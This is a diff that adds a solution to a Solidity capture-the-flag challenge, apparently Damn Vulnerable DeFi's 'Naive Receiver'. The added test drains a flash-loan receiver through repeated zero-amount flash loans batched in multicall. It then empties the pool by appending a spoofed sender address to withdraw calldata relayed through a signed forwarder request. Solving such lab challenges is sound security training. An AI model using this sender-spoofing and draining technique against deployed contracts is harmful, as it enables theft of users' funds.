@@ -77,7 +77,44 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        // First, recover funds from the FlashLoanReceiver
+        bytes memory receiverDrainCalldata = abi.encodeWithSignature("flashLoan(address,address,uint256,bytes)", receiver, address(weth), 0, "");
+        bytes[] memory multicallPayloadOne = new bytes[](10);
+        for (uint8 i = 0; i < 10; i++) {
+            multicallPayloadOne[i] = receiverDrainCalldata;
+        }
+        pool.multicall(multicallPayloadOne);
+
+        // Then, drain the NaiveReceiverPool by using both the multicall and the forwarder
+        // We first craft a call to withdraw, and add the address of the deployer at the end.
+        // Since we are going through the multicall, we can send any arbitrary calldata, and since we go through
+        // the forwarder, the msg.sender will be obtained from the last 20 bytes of the calldata.
+        bytes memory poolDrainCallData = abi.encodePacked(abi.encodeWithSignature("withdraw(uint256,address)", pool.deposits(deployer), recovery), deployer);
+        bytes[] memory multicallPayloadTwo = new bytes[](1);
+        multicallPayloadTwo[0] = poolDrainCallData;
+        bytes memory forwarderCallData = abi.encodeWithSignature("multicall(bytes[])", multicallPayloadTwo);
+
+        BasicForwarder.Request memory request = BasicForwarder.Request(
+            player,
+            address(pool),
+            0,
+            gasleft(),
+            0,
+            forwarderCallData,
+            block.timestamp
+        );
+
+        // Signing the request
+        bytes32 dataHash = keccak256(abi.encodePacked(
+            hex"19_01",
+            forwarder.domainSeparator(),
+            forwarder.getDataHash(request)
+        ));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, dataHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        // Calling the Recovery contract
+        forwarder.execute(request, signature);
     }
 
     /**
